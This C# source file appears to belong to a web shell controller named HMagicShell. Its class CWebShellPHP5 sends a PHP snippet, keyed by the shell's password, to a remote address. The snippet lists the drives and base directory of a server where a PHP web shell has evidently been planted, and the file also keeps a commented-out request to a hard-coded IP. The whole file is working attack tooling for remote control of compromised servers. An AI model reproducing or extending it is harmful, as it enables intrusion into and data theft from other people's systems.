using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using HMagicShell.EncryptAndDecode;

namespace HMagicShell.ShellType
{
    public class CWebShellPHP5 : IWebShellControl
    {
        public string Address { get; set; }
        public string Password { get; set; }
        public Encoding Encoding { get; set; }
        public IShellTransmissionEncryptAndDecrypt EncryptAndDecrypt { get; set; }
        public async Task<string> GetAllVolumes()
        {
            string strRet = "";
            string strCode = "$a=dirname(__FILE__);$b=explode(\"\\\",$a);$c=array();foreach(range('a','z')as $d){if(disk_total_space($d.\":\")!=NULL){array_push($c,$d);}}$e=array(\"DiskList\"=>$c,\"BaseDir\"=>dirname(__FILE__));echo json_encode($e);";

            var kvp = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string, string>(Password, strCode)
            };

            HttpClient client = new HttpClient();
            HttpResponseMessage response = await client.PostAsync(Address, new FormUrlEncodedContent(kvp));
            //HttpResponseMessage response = await client.GetAsync("http://220.181.38.150");
            if (response.EnsureSuccessStatusCode().StatusCode == System.Net.HttpStatusCode.OK)
            {
                var responseData = await response.Content.ReadAsByteArrayAsync();
                strRet = Encoding.GetString(responseData);
            }
            return strRet;
        }

        public void SetInfo(string address, string password, Encoding encoding, IShellTransmissionEncryptAndDecrypt itead)
        {
            Address = address;
            Password = password;
            Encoding = encoding;
            EncryptAndDecrypt = itead;
        }
    }
}
